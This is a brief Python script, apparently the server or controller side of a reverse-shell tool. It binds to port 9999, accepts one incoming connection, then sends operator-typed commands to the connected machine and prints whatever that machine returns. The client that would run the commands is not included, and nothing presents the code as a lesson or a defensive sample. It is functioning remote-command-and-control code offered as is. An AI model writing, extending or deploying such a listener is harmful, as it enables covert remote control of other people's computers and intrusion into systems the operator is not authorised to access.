#for aditional information email: shaykhsiddiqee@gmail.com

import socket
import sys

def create_socket():
    try:
        global host
        global port
        global skt
        host =""
        port =9999
        skt = socket.socket()
    except socket.error as msg:
        print("Socket Creation Error: "+ str(msg)+"\n")


def bind_sockets():
    try:
        global host
        global port
        global skt

        print("Binding the port: "+ str(port) +" .....\n")
        skt.bind((host, port))
        skt.listen(5)

    except socket.error as msg:
        print("Socket binding error: "+ str(msg)+"\nRetrying...")
        bind_sockets()


def socket_accept():
    conn, address = skt.accept()
    print("Connection established | Ip: " + address[0] + " port: " + str(address[1]))

    #here goes all commands
    send_commands(conn)
    conn.close()


def send_commands(conn):

    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            skt.close()
            sys.exit()
        if len(str.encode(cmd))>0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")


def main():
    create_socket()
    bind_sockets()
    socket_accept()


main()
